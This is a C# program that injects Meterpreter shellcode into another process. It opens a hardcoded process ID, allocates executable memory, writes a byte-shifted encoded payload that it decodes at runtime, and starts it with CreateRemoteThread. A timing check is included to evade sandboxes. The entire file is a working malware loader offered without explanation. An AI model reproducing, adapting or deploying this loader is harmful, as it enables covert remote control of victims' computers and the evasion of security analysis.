﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
	class Program
	{
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll")]
		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);
		static void Main(string[] args)
		{
			IntPtr hProcess = OpenProcess(0x001F0FFF, false, 260);
			IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

			// addting time in our payload 

			DateTime t1 = DateTime.Now;
			Sleep(2000);
			double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
			if (t2 < 1.5)
			{
				return;
			}

			// helper module shellcode 
			// generate meterpreter shellocde and paste in helper then generate output and paste here

			byte[] buf = new byte[771] { 0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x53, 0x58, 0x4a, 0x33, 0xd4, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x4a, 0x8d, 0x54, 0x1a, 0x4a, 0x8d, 0x54, 0x22, 0x4f, 0x33, 0xcb, 0x4a, 0x8d, 0x74, 0x52, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x4a, 0x8d, 0x54, 0x22, 0x43, 0x53, 0x8d, 0x44, 0x3e, 0x4a, 0x03, 0xd2, 0x68, 0x83, 0x7a, 0x1a, 0x0d, 0x04, 0x11, 0x87, 0x74, 0x02, 0x02, 0x02, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x69, 0x4a, 0x03, 0xd2, 0x8d, 0x4a, 0x1a, 0x46, 0x8d, 0x42, 0x22, 0x4b, 0x03, 0xd2, 0x52, 0xe5, 0x58, 0x4f, 0x33, 0xcb, 0x4a, 0x01, 0xcb, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4a, 0x33, 0xc2, 0x43, 0xc3, 0xcb, 0x0f, 0xae, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda, 0x5a, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x43, 0x8d, 0x0e, 0x4a, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x8d, 0x06, 0x8a, 0x4a, 0x03, 0xd2, 0x43, 0x5a, 0x43, 0x5a, 0x60, 0x5b, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22, 0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x4a, 0x8d, 0x14, 0xeb, 0x4d, 0x01, 0x01, 0x01, 0x5f, 0x4a, 0x33, 0xdd, 0x55, 0x4b, 0xc0, 0x79, 0x6b, 0x70, 0x6b, 0x70, 0x67, 0x76, 0x02, 0x43, 0x58, 0x4a, 0x8b, 0xe3, 0x4b, 0xc9, 0xc4, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x55, 0x55, 0x4a, 0x8b, 0xe3, 0x55, 0x5c, 0x4f, 0x33, 0xc2, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xbc, 0x3c, 0x58, 0x7b, 0xa9, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0x10, 0x02, 0x02, 0x02, 0x33, 0x3b, 0x34, 0x30, 0x33, 0x38, 0x3a, 0x30, 0x36, 0x3b, 0x30, 0x37, 0x3b, 0x02, 0x5c, 0x4a, 0x8b, 0xc3, 0x4b, 0xc9, 0xc2, 0xbd, 0x03, 0x02, 0x02, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x6c, 0x05, 0x55, 0x4b, 0xbc, 0x59, 0x8b, 0xa1, 0xc8, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0xdc, 0x02, 0x02, 0x02, 0x31, 0x59, 0x72, 0x6f, 0x6b, 0x52, 0x4f, 0x59, 0x74, 0x53, 0x50, 0x45, 0x57, 0x63, 0x72, 0x58, 0x71, 0x3b, 0x57, 0x45, 0x76, 0x65, 0x79, 0x69, 0x36, 0x6c, 0x6f, 0x7c, 0x6f, 0x4c, 0x6d, 0x33, 0x32, 0x39, 0x6e, 0x49, 0x5c, 0x5c, 0x49, 0x63, 0x73, 0x6b, 0x68, 0x51, 0x57, 0x6c, 0x67, 0x6d, 0x6a, 0x69, 0x4c, 0x33, 0x46, 0x72, 0x49, 0x65, 0x55, 0x79, 0x67, 0x58, 0x32, 0x79, 0x72, 0x4d, 0x6f, 0x6b, 0x6a, 0x6a, 0x4a, 0x36, 0x70, 0x7b, 0x4a, 0x51, 0x4f, 0x49, 0x67, 0x43, 0x75, 0x66, 0x4c, 0x39, 0x4d, 0x74, 0x77, 0x36, 0x32, 0x38, 0x46, 0x58, 0x6d, 0x67, 0x58, 0x65, 0x52, 0x4f, 0x4d, 0x4f, 0x69, 0x4a, 0x33, 0x6f, 0x61, 0x70, 0x61, 0x53, 0x58, 0x69, 0x53, 0x53, 0x38, 0x35, 0x73, 0x46, 0x50, 0x7a, 0x53, 0x58, 0x66, 0x59, 0x36, 0x74, 0x49, 0x77, 0x4b, 0x38, 0x6d, 0x46, 0x66, 0x7b, 0x50, 0x5b, 0x58, 0x39, 0x7b, 0x36, 0x63, 0x6b, 0x7b, 0x53, 0x46, 0x32, 0x52, 0x79, 0x6c, 0x65, 0x61, 0x36, 0x6f, 0x66, 0x3b, 0x7b, 0x78, 0x32, 0x52, 0x3a, 0x45, 0x5a, 0x3b, 0x49, 0x51, 0x7a, 0x75, 0x6b, 0x4a, 0x5a, 0x74, 0x70, 0x33, 0x2f, 0x44, 0x71, 0x61, 0x53, 0x6d, 0x4d, 0x4d, 0x49, 0x45, 0x68, 0x6c, 0x44, 0x6d, 0x32, 0x5c, 0x6c, 0x4c, 0x4f, 0x74, 0x5c, 0x68, 0x59, 0x49, 0x61, 0x6d, 0x45, 0x70, 0x3b, 0x38, 0x48, 0x57, 0x4c, 0x37, 0x4a, 0x57, 0x53, 0x53, 0x6f, 0x73, 0x6c, 0x77, 0x33, 0x6e, 0x33, 0x59, 0x50, 0x47, 0x02, 0x4a, 0x8b, 0xc3, 0x55, 0x5c, 0x43, 0x5a, 0x4f, 0x33, 0xcb, 0x55, 0x4a, 0xba, 0x02, 0x34, 0xaa, 0x86, 0x02, 0x02, 0x02, 0x02, 0x52, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0xed, 0x57, 0x30, 0x3d, 0x01, 0xd7, 0x4a, 0x8b, 0xc8, 0x6c, 0x0c, 0x61, 0x4a, 0x8b, 0xf3, 0x6c, 0x21, 0x5c, 0x54, 0x6a, 0x82, 0x35, 0x02, 0x02, 0x4b, 0x8b, 0xe2, 0x6c, 0x06, 0x43, 0x5b, 0x4b, 0xbc, 0x77, 0x48, 0xa0, 0x88, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4f, 0x33, 0xc2, 0x55, 0x5c, 0x4a, 0x8b, 0xf3, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0x2f, 0x08, 0x1a, 0x7d, 0x01, 0xd7, 0x87, 0xc2, 0x77, 0x21, 0x4a, 0xc9, 0xc3, 0x8a, 0x15, 0x02, 0x02, 0x4b, 0xbc, 0x46, 0xf2, 0x37, 0xe2, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x01, 0xd1, 0x76, 0x04, 0xed, 0xac, 0xea, 0x57, 0x02, 0x02, 0x02, 0x55, 0x5b, 0x6c, 0x42, 0x5c, 0x4b, 0x8b, 0xd3, 0xc3, 0xe4, 0x12, 0x4b, 0xc9, 0xc2, 0x02, 0x12, 0x02, 0x02, 0x4b, 0xbc, 0x5a, 0xa6, 0x55, 0xe7, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x95, 0x55, 0x55, 0x4a, 0x8b, 0xe9, 0x4a, 0x8b, 0xf3, 0x4a, 0x8b, 0xdc, 0x4b, 0xc9, 0xc2, 0x02, 0x22, 0x02, 0x02, 0x4b, 0x8b, 0xfb, 0x4b, 0xbc, 0x14, 0x98, 0x8b, 0xe4, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x85, 0xc6, 0x22, 0x87, 0xc2, 0x76, 0xb4, 0x68, 0x8d, 0x09, 0x4a, 0x03, 0xc5, 0x87, 0xc2, 0x77, 0xd4, 0x5a, 0xc5, 0x5a, 0x6c, 0x02, 0x5b, 0x4b, 0xc9, 0xc4, 0xf2, 0xb7, 0xa4, 0x58, 0x01, 0xd7, };
			for (int i = 0; i < buf.Length; i++)

			{
				buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);

			}

			IntPtr outSize;
			WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

			IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
		}

	}
}
